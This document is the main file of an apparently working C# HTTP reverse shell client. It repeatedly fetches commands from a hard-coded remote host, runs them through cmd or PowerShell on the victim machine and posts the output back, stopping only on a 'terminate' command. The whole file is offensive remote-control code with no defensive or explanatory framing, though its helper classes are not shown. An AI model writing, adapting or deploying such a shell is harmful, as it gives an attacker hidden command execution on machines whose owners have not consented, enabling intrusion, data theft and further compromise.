using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Management.Automation.Runspaces;

namespace HTTPRevShell_Client
{
    class Program
    {
        static void Main(string[] args)
        {
            string host = "10.200.32.131"; // change the host ip
            string url = String.Format("http://{0}/", host);
            string location = Directory.GetCurrentDirectory();
            Commands commands = new Commands();

            while(true)
            {
                String cmd = Utilities.Get(url, location);
                if (cmd == "terminate")
                {
                    break;
                }
                if (cmd == "help")
                {
                    Utilities.Post(url, Utilities.PrintHelp());
                }
                else if (cmd.StartsWith("cd ")) 
                {
                    location = commands.ChangeLocation(cmd, location, url);
                }
                else if (cmd.StartsWith("powershell "))
                {
                    string output = commands.RunPSH(cmd, location);
                    Utilities.Post(url, output.ToString());
                }
                else
                {
                    (string output, string error) = commands.RunCMD(cmd, location);

                    output = (error.Length != 0) ? String.Concat("#!#", error) : output;

                    Utilities.Post(url, output);
                }
            }
        }
    }
}
